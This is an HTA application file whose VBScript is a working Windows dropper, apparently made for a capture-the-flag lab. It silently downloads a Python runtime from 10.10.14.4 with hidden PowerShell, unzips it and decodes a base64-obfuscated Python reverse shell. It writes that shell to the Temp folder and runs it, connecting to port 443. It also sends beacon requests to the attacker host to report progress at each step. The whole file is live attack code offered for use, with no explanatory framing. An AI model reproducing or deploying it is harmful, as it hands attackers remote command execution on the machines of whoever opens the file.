<html>

<head>
  <title>Yes Hell</title>
  <HTA:APPLICATION>
</head>

<body>

<script language="vbscript">
    document.title = "Welcome to hell"
    self.ResizeTo 200,200

    Sub Window_Onload
    self.MoveTo (screen.availWidth - (document.body.clientWidth + 40)),10
    End Sub
</script>

<script language="vbscript">
lhost = "10.10.14.4"
Set WshShell = CreateObject("WScript.Shell")
username = CreateObject("WScript.Network").UserName
Set fso = CreateObject("Scripting.FileSystemObject")

path = "C:\Users\\" & username & "\Appdata\Local\Temp\python3.zip"
If fso.FileExists(path) Then
    With CreateObject("WinHttp.WinHttpRequest.5.1")
        .Open "GET", "http://" & lhost & "/zip_exists", False
        .Send
        httpGet = .ResponseText
    End With
Else
    return = WshShell.Run("powershell -Command Invoke-WebRequest -UseBasicParsing http://" & lhost & "/python3.zip -O C:\Users\\" & username & "\Appdata\Local\Temp\python3.zip", 0, true)
End If

path2 = "C:\Users\\" & username & "\Appdata\Local\Temp\python3\minimal_python"

If fso.FolderExists(path2) then 
    With CreateObject("WinHttp.WinHttpRequest.5.1")
        .Open "GET", "http://" & lhost & "/directory_exists", False
        .Send
        httpGet = .ResponseText
    End With
Else
    return = WshShell.Run("powershell -Command Expand-Archive -Path C:\Users\\" & username & "\AppData\Local\Temp\python3.zip -DestinationPath C:\Users\\" & username & "\Appdata\Local\Temp\python3", 0, true)     
End if

path3 = "C:\Users\\" & username & "\Appdata\Local\Temp\python3\minimal_python\python.exe"
If fso.FileExists(path3) Then
    With CreateObject("WinHttp.WinHttpRequest.5.1")
        .Open "GET", "http://" & lhost & "/python_exe_exists", False
        .Send
        httpGet = .ResponseText
    End With
End If

' write a python reverse shell
return = WshShell.Run("powershell -C $e='aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzEwLjEwLjE0LjQnLDQ0MykpCndoaWxlIDE6CiAgICB0cnk6CiAgICAgICAgcy5zZW5kKHN0ci5lbmNvZGUob3MuZ2V0Y3dkKCkgKyAiLy8iKSkKICAgICAgICBkYXRhPXMucmVjdigxMDI0KS5kZWNvZGUoIlVURi04IikKICAgICAgICBkYXRhPWRhdGEuc3RyaXAoJ1xuJykKICAgICAgICBpZiBkYXRhPT0icXVpdCI6IAogICAgICAgICAgICBicmVhawogICAgICAgIGlmIGRhdGFbOjJdPT0iY2QiOgogICAgICAgICAgICBvcy5jaGRpcihkYXRhWzM6XSkKICAgICAgICBpZiBsZW4oZGF0YSk+MDoKICAgICAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKSAKICAgICAgICAgICAgc3Rkb3V0X3ZhbHVlPXByb2Muc3Rkb3V0LnJlYWQoKSArIHByb2Muc3RkZXJyLnJlYWQoKQogICAgICAgICAgICBvdXRwdXRfc3RyPXN0cihzdGRvdXRfdmFsdWUsICJVVEYtOCIpCiAgICAgICAgICAgIHMuc2VuZChzdHIuZW5jb2RlKCJcbiIgKyBvdXRwdXRfc3RyKSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBjb250aW51ZQpzLmNsb3NlKCk=';[System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($e)) -Replace '10.10.14.4', '" & lhost & "' -Replace '443', '443' | Out-File -Encoding ASCII C:\Users\\" & username & "\Appdata\Local\Temp\script.py", 0, true)

path4 = "C:\Users\\" & username & "\Appdata\Local\Temp\script.py"
If fso.FileExists(path4) Then
    With CreateObject("WinHttp.WinHttpRequest.5.1")
        .Open "GET", "http://" & lhost & "/python_script_exists", False
        .Send
        httpGet = .ResponseText
    End With
End If

' run the python reverse shell
return = WshShell.Run("C:\Users\\" & username & "\Appdata\Local\Temp\python3\minimal_python\python.exe C:\Users\\" & username & "\Appdata\Local\Temp\script.py", 0, true)

With CreateObject("WinHttp.WinHttpRequest.5.1")
    .Open "GET", "http://" & lhost & "/end_check_exist", False
    .Send
    httpGet = .ResponseText
End With
</script>
</body>